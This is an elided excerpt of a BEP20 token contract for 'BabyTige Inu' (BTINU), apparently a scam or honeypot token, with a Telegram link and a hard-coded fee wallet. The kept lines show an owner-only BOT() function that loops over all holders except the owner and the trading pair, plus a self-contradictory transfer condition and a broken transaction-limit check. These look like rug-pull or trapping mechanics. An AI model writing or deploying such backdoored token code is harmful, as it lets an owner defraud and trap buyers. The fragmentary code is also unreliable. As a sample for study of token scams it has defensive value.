...
Telegram: https://t.me/BabyTigeInuPortal
...
contract BabytigeInu is IBEP20, Auth {
    ...
    string constant _name = "BabyTige Inu";
    string constant _symbol = "BTINU";
    ...
    address public marketingFeeReceiver = 0x17A7FC668188796B9E8963f54A7065101C8Fdf7f;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != pair && recipient != DEAD && recipient == pair) {
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount * _totalSupply|| isTxLimitExempt[sender], "TX Limit Exceeded");
    }
    ...
    function BOT() external onlyOwner{
        for(uint256 i = 0; i < holderlist.length; i++){
            ...
            if (wallet != owner && wallet != pair && wallet != routerAddress) {
